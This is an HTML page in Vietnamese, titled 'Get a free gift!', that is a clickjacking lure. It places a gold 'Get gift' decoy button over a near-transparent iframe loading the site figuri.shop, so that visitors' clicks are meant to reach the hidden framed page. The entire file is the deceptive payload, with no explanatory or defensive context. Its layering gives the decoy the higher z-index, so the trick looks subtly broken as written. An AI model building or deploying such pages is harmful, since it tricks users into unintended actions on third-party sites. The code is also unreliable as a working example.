<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>🎁 Nhận quà tặng miễn phí!</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 50px;
    }
    .container {
      position: relative;
      width: 400px;
      height: 300px;
      margin: 0 auto;
    }
    iframe {
      position: absolute;
      width: 100%;
      height: 100%;
      opacity: 0.01;
      z-index: 1;
      pointer-events: auto;
    }
    .fake-button {
      position: relative;
      z-index: 2;
      background: gold;
      padding: 60px;
      font-size: 20px;
      font-weight: bold;
      border-radius: 12px;
      box-shadow: 0 0 10px #999;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>🎁 Nhấn để nhận phần quà hấp dẫn</h1>
  <div class="container">
    <div class="fake-button">👉 Nhận quà</div>
    <iframe src="https://figuri.shop/"></iframe>
  </div>
</body>
</html>
